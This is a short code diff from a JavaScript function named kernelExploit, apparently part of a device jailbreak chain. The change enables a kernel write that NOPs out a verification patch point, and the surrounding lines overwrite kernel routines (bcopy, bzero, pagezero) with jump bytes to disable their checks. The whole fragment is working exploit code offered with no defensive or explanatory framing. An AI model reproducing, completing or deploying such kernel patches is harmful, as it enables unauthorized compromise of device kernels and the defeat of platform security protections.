@@ -580,7 +580,7 @@ function kernelExploit() {
   kchain.pushSymbolic();
   kchain.finalizeSymbolic(idx1, idx1_dest);
   kchain.finalizeSymbolic(idx2, idx2_dest);
- // kchain2.kwrite2(KERNEL_veriPatch, 0x9090);
+  kchain2.kwrite2(KERNEL_veriPatch, 0x9090);
   kchain2.kwrite1(KERNEL_bcopy, 0xEB);
   kchain2.kwrite1(KERNEL_bzero, 0xEB);
   kchain2.kwrite1(KERNEL_pagezero, 0xEB);
